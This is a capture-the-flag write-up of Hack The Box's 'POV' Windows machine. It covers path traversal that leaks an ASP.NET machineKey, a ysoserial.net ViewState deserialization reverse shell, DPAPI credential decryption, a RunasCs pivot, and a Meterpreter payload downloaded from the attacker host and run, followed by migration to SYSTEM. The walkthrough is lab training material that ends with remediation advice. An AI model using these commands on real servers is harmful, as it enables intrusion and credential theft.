# HTB Write-Up: POV

| Field      | Details                                                    |
|------------|------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/POV)    |
| Difficulty | Medium                                                     |
| OS         | Windows                                                    |
| Author     | Samurai                                                    |
| Date       | June 11, 2026                                              |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Web Application & Subdomain Discovery](#2-enumeration--web-application--subdomain-discovery)
3. [Initial Access — LFI via ViewState Deserialization (ASP.NET MachineKey RCE)](#3-initial-access--lfi-via-viewstate-deserialization-aspnet-machinekey-rce)
4. [Lateral Movement — Credential Recovery from XML Credential File](#4-lateral-movement--credential-recovery-from-xml-credential-file)
5. [Privilege Escalation — Meterpreter Process Migration to SYSTEM](#5-privilege-escalation--meterpreter-process-migration-to-system)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **Nmap** using aggressive detection flags:

```bash
nmap -A 10.129.230.183
```

**Open Ports:**

| Port | Service | Notes                                      |
|------|---------|--------------------------------------------|
| 80   | HTTP    | Microsoft IIS 10.0 — domain: `pov.htb`    |

Only port 80 was exposed. The server was identified as **Microsoft IIS 10.0** running on **Windows Server 2019**. With a single HTTP service and no other ports, the web application is the sole attack surface.

---

## 2. Enumeration — Web Application & Subdomain Discovery

### 2.1 — Subdomain Fuzzing

The web application at `pov.htb` was a static landing page with no obvious functionality. Subdomain fuzzing was performed with **ffuf**, filtering out the default response size of 12330:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -u http://pov.htb \
     -H "Host: FUZZ.pov.htb" \
     -fs 12330
```

**Result:**

```
dev     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 75ms]
```

The subdomain `dev.pov.htb` was discovered and added to `/etc/hosts`.

### 2.2 — dev.pov.htb — Portfolio Application

`dev.pov.htb` hosted a developer portfolio built with **ASP.NET WebForms** (`/portfolio/default.aspx`). The page contained a **CV download button** that submitted a POST request with a `file` parameter:

```
POST /portfolio/default.aspx
...
file=cv.pdf
```

### 2.3 — Local File Inclusion via File Parameter

The `file` parameter was tested for path traversal. By manipulating the value to `....//web.config`, the server's `web.config` was successfully returned:

```
POST /portfolio/default.aspx
...
file=....//web.config
```

**Response — `web.config` contents:**

```xml
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey
      decryption="AES"
      decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"
      validation="SHA1"
      validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
</configuration>
```

The `machineKey` — both the `decryptionKey` and `validationKey` — was now in hand. This is critical: ASP.NET uses the machine key to sign and encrypt the `__VIEWSTATE` parameter. With these keys, a forged ViewState payload carrying arbitrary .NET deserialization gadgets can be crafted and the server will trust and execute it.

---

## 3. Initial Access — LFI via ViewState Deserialization (ASP.NET MachineKey RCE)

### 3.1 — Vulnerability Background

ASP.NET WebForms serialize application state into a hidden `__VIEWSTATE` field that is sent to the client and returned on every POST. The server validates and decrypts this value using the `machineKey`. When the machine key is known to an attacker, **ysoserial.net** can be used to craft a ViewState payload embedding a .NET deserialization gadget that executes an OS command when the server deserializes the tampered ViewState.

### 3.2 — Generating the Payload

**ysoserial.net** was used with the `WindowsIdentity` gadget and `ViewState` plugin, supplying the extracted machine key material:

```bash
wine ysoserial.exe -p ViewState \
  -g WindowsIdentity \
  --decryptionalg="AES" \
  --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
  --validationalg="SHA1" \
  --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" \
  --path="/portfolio" \
  -c "powershell -e <base64_encoded_reverse_shell>" 2>/dev/null | tr -d '\n'
```

The embedded command was a Base64-encoded PowerShell reverse shell targeting the attacker on port 1337.

### 3.3 — Delivering the Payload

A netcat listener was started, and the generated ViewState token was injected into the `__VIEWSTATE` field of the POST request to `/portfolio/default.aspx`. The server deserialized the payload and executed the PowerShell command.

**Result — Shell obtained as `sfitz`:**

```
connect to [10.10.15.24] from (UNKNOWN) [10.129.230.183] 49660
Microsoft Windows [Version 10.0.17763.5329]
C:\windows\system32\inetsrv>whoami
pov\sfitz
```

**Note:** The user flag is not accessible from `sfitz` — lateral movement to `alaading` is required first.

---

## 4. Lateral Movement — Credential Recovery from XML Credential File

### 4.1 — Discovering the Credential File

Enumeration of `sfitz`'s home directory revealed a file of immediate interest:

```
C:\Users\sfitz\Documents\connection.xml
```

This file contained a **PowerShell PSCredential object** serialized to XML — a `SecureString`-encrypted credential belonging to the user `alaading`.

### 4.2 — Decrypting the Credential

`SecureString` credentials stored via `Export-Clixml` are encrypted with the **DPAPI** of the user who created them. Since the shell was running as `sfitz`, the credential could be decrypted in-session:

```powershell
$cred = Import-CliXml -Path connection.xml
$cred.GetNetworkCredential().Password
```

**Result:**

```
f8gQ8fynP44ek1m3
```

Password for `alaading` recovered.

### 4.3 — Lateral Movement with RunasCs

Direct WinRM access was not available from the current shell context. **RunasCs** was transferred to the target and used to spawn a reverse shell as `alaading`:

```powershell
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.15.24:9001
```

**Result — Shell obtained as `alaading`:**

```
connect to [10.10.15.24] from (UNKNOWN) [10.129.230.183] 49675
C:\Windows\system32> whoami
pov\alaading
```

**User flag retrieved from `C:\Users\alaading\Desktop\user.txt`.**

---

## 5. Privilege Escalation — Meterpreter Process Migration to SYSTEM

### 5.1 — Approach

With a shell as `alaading`, privilege escalation to `SYSTEM` was achieved by migrating a Meterpreter session into a SYSTEM-level process (`winlogon.exe`), which runs in Session 1 under `NT AUTHORITY\SYSTEM`.

### 5.2 — Generating and Delivering the Meterpreter Payload

A Windows x64 Meterpreter reverse TCP payload was generated with **msfvenom**:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=tun0 lport=9002 -f exe > samurai.exe
```

The payload was served via a Python HTTP server and downloaded on the target:

```powershell
curl 10.10.15.24/samurai.exe -o samurai1.exe
.\samurai1.exe
```

A Metasploit `multi/handler` caught the incoming session:

```
[*] Meterpreter session 5 opened (10.10.15.24:9002 -> 10.129.230.183:49683)
```

### 5.3 — Process Migration

With an active Meterpreter session, `winlogon.exe` was identified as a SYSTEM-level process:

```
meterpreter > ps winlogon.exe

PID  PPID  Name          Arch  Session  User  Path
---  ----  ----          ----  -------  ----  ----
552  472   winlogon.exe  x64   1              C:\Windows\System32\winlogon.exe
```

Migration into PID 552 elevated the session to `NT AUTHORITY\SYSTEM`:

```
meterpreter > migrate 552
[*] Migrating from 4860 to 552...
[*] Migration completed successfully.

meterpreter > shell
C:\Windows\system32> whoami
nt authority\system
```

**Root flag retrieved from `C:\Users\Administrator\Desktop\root.txt`.**

---

## 6. Summary

| Phase                  | Technique                                                                    | Result                              |
|------------------------|------------------------------------------------------------------------------|-------------------------------------|
| Recon                  | Nmap aggressive scan                                                         | Port 80 (IIS 10.0) identified       |
| Enumeration            | ffuf subdomain fuzzing → `dev.pov.htb` discovered                           | ASP.NET WebForms portfolio found    |
| LFI                    | Path traversal via `file` parameter → `web.config` leaked                   | MachineKey (AES + SHA1) recovered   |
| Initial Access         | ysoserial.net ViewState deserialization → PowerShell reverse shell           | Shell as `sfitz`                    |
| Lateral Movement       | `connection.xml` PSCredential decrypted via DPAPI → RunasCs                 | Shell as `alaading`                 |
| Privilege Escalation   | Meterpreter payload → migrate into `winlogon.exe` (PID 552)                 | Shell as `NT AUTHORITY\SYSTEM`      |

### Key Takeaways

- **The ASP.NET MachineKey is a master secret — treat it as one.** Leaking `web.config` via an LFI is game over for any ASP.NET WebForms application. The machine key allows an attacker to forge trusted ViewState payloads and achieve unauthenticated RCE. `web.config` must never be readable by the web application user, and LFI vectors must be eliminated entirely.
- **Path traversal in file download endpoints is a critical finding.** Filtering only on file extension (e.g. `.pdf`) is insufficient — the traversal sequence (`....//`) bypassed naive sanitization. Proper remediation requires canonicalizing paths and enforcing that the resolved path falls within an allowed directory.
- **PSCredential XML files are only as secure as the user account that created them.** `Export-Clixml` uses DPAPI tied to the creating user's context. Any process or shell running as that user can silently decrypt the credential. Storing credentials this way on shared or internet-exposed systems is dangerous — use a secrets manager instead.
- **Process migration into SYSTEM-level processes is a reliable post-exploitation technique on Windows.** `winlogon.exe` and `lsass.exe` consistently run as SYSTEM and are viable migration targets when a Meterpreter session exists under a sufficiently privileged user. Behavioral detection of unexpected process injection into these processes is an important EDR signal to tune for.
